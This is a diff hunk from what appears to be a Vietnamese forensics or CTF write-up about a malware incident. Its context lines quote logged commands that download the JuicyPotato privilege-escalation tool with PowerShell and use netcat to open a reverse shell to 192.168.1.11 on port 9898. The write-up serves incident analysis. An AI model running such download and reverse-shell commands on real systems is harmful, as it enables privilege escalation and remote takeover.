@@ -57,6 +57,7 @@ Tin tặc thực hiện các hành động độc hại mà không gây nghi ng�
 > ***Malware then downloads a new file, find out the full url of the file download***
 - Tại câu hỏi đầu tiên hacker thực thi lệnh và tải về file tại `"CommandLine": "C:\\windows\\temp\\supply.exe /c \"powershell -c INvoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\\Windows\\Temp\\juice.exe\"\n",`
 > A : https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+
 > ***What is the port the attacker attempts to get reverse shell?***
 - Sau khi tải xuống hacker tạo reverse shell  bằng netcat tại 192.168.1.11 và port 9898 `"CommandLine": "C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \"192.168.1.11 9898 -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\"\n",`
 
